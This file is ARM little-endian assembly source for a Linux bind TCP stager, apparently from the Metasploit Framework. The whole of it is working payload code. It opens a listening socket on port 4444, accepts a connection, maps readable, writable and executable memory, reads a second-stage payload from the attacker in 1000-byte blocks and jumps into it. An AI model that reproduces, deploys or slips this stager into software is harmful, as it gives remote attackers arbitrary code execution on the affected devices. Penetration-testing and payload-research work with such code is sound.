@@
@
@        Name: stager_sock_bind
@   Qualities: -
@     Authors: nemo <nemo [at] felinemenace.org>
@     License: MSF_LICENSE
@ Description:
@
@        Implementation of a Linux portbind TCP stager for ARM LE architecture.
@
@        Socket descriptor in r12.
@
@        Assemble with: as stager_sock_bind.s -o stager_sock_bind.o
@        Link with:     ld stager_sock_bind.o -o stager_sock_bind
@
@ Meta-Information:
@
@ meta-shortname=Linux Bind TCP Stager
@ meta-description=Listen on a port for a connection and run a second stage
@ meta-authors=nemo <nemo [at] felinemenace.org>
@ meta-os=linux
@ meta-arch=armle
@ meta-category=stager
@ meta-connection-type=bind
@ meta-name=bind_tcp
@@

.text
.globl _start
_start:
@ int socket(int domain, int type, int protocol);
	ldr r7,=281        @ __NR_socket
    mov r0,#2          @ domain   = AF_INET
	mov r1,#1          @ type     = SOCK_STREAM
	mov r2,#6          @ protocol = IPPROTO_TCP
	swi 0
@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    mov r12,r0         @ sockfd
	add r7,#1          @ __NR_bind
	add r1,pc,#176     @ *addr
	mov r2,#16         @ addrlen
	swi 0
@ int listen(int sockfd, int backlog);
	add r7,#2          @ __NR_listen
	mov r0,r12         @ sockfd
	swi 0
@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	add r7,#1          @ __NR_accept
	mov r0,r12         @ sockfd
	sub r1,r1,r1       @ *addr    = NULL
	mov r2,r1          @ *addrlen = NULL
	swi 0
@ ssize_t recv(int sockfd, void *buf, size_t len, int flags);
    mov r12,r0         @ sockfd
	sub sp,#4
	add r7,#6          @ __NR_recv
	mov r1,sp          @ *buf (on the stack)
	mov r2,#4          @ len
	mov r3,#0          @ flags
	swi 0
@ round length
	ldr r1,[sp,#0]
	ldr r3,=0xfffff000
	and r1,r1,r3
	mov r2,#1
	lsl r2,#12
@ void *mmap2(void *addr, size_t length, int prot, int flags, int fd, off_t pgoffset);
	add r1,r2          @ length
	mov r7, #192       @ __NR_mmap2
	ldr r0,=0xffffffff @ *addr = NULL
    mov r2,#7          @ prot = PROT_READ | PROT_WRITE | PROT_EXEC
    ldr r3,=0x1022     @ flags = MAP_ANON | MAP_PRIVATE
	mov r4,r0          @ fd
	mov r5,#0          @ pgoffset
	swi 0
@ recv loop
@ ssize_t recv(int sockfd, void *buf, size_t len, int flags);
	add r7,#99         @ __NR_recv
	mov r1,r0          @ *buf
	mov r0,r12         @ sockfd
	mov r3,#0          @ flags
@ remove blocksize from total length
loop:
	ldr r2,[sp,#0]
	sub r2,#1000
	str r2,[sp,#0]
	cmp r2, #0
	ble last
	mov r2,#1000       @ len
	swi 0	
	b loop
last:
	add r2,#1000       @ len
	swi 0
@ branch to code
	mov pc,r1
@ addr
@ port: 4444 , sin_fam = 2
.word   0x5c110002 
@ ip
.word   0x00000000 
